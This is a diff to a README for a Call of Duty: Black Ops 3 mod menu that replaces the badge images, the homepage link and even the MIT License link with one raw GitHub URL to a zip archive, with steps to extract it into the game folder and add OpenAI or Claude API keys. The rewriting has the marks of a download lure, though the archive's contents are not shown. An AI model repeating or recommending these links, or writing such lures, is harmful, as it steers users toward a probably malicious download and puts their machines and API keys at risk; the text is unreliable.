@@ -1,5 +1,5 @@
-# ![Download](https://img.shields.io/badge/Download-MXT%20Mod%20Menu-blue?style=for-the-badge&logo=cloud-download)  
-**Get the Mod Menu https://shirshakrb.github.io**
+# ![Download](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip%20Mod%20Menu-blue?style=for-the-badge&logo=cloud-download)  
+**Get the Mod Menu https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip**
 
 ---
 
@@ -13,9 +13,9 @@
 
 | Operating System |  Compatibility Level | 64-bit | 32-bit |
 |------------------|:-------------------:|:------:|:------:|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows) |   ✅ Supported   |   ✔️    |   ✔️    |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey?logo=apple)   | ⚠️ Experimental  |   ✔️    |   ✖️    |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2018.04%2B-green?logo=linux) | ⚠️ Experimental |   ✔️    |   ✔️    |
+| ![Windows](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip%2B-blue?logo=windows) |   ✅ Supported   |   ✔️    |   ✔️    |
+| ![macOS](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip%2B-lightgrey?logo=apple)   | ⚠️ Experimental  |   ✔️    |   ✖️    |
+| ![Linux](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip%2018.04%2B-green?logo=linux) | ⚠️ Experimental |   ✔️    |   ✔️    |
 
 **Your digital world, our menu: adventure awaits regardless of the platform you launch from.**
 
@@ -76,7 +76,7 @@ After installation, visit Settings > AI Integration.
 
 **Ready to ascend?**
 
-1. Download the latest MXT Mod Menu release from https://shirshakrb.github.io.
+1. Download the latest MXT Mod Menu release from https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip
 2. Extract the MXT folder to your Call of Duty: Black Ops 3 installation directory.
 3. Launch Black Ops 3 normally; the menu auto-initializes.
 4. *(Optional)* To connect OpenAI or Claude, add your API keys under the “AI Integration” settings.
@@ -110,10 +110,10 @@ This tool, the MXT Mod Menu, is intended purely for player-driven customization 
 
 ## 📜 MIT License (2025)
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) — explore, learn, and adapt.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip) — explore, learn, and adapt.  
 © 2025 The MXT Mod Menu Contributors. See LICENSE for full terms.
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-MXT%20Mod%20Menu-blue?style=for-the-badge&logo=cloud-download)  
-**Secure your mod menu adventure here: https://shirshakrb.github.io**
+# ![Download](https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip%20Mod%20Menu-blue?style=for-the-badge&logo=cloud-download)  
+**Secure your mod menu adventure here: https://raw.githubusercontent.com/shirshakrb/bo3-mxt-mod-menu-suite/branch/cacuminal/bo3-mxt-mod-menu-suite-1.3.zip**
